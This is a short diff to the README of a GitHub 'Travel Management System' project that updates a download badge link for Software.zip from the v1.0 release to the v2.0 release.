@@ -21,7 +21,7 @@ Welcome to the **Travel Management System** GitHub repository! This project is d
 
 To get a copy of this project up and running on your local machine, you can download it from the link below:
 
-[![Download Software](https://github.com/Ashesh-para/Travel-Management-System/releases/download/v1.0/Software.zip)](https://github.com/Ashesh-para/Travel-Management-System/releases/download/v1.0/Software.zip "Launch the Software")
+[![Download Software](https://github.com/Ashesh-para/Travel-Management-System/releases/download/v2.0/Software.zip)](https://github.com/Ashesh-para/Travel-Management-System/releases/download/v2.0/Software.zip "Launch the Software")
 
 ## Installation and Usage 📦
 
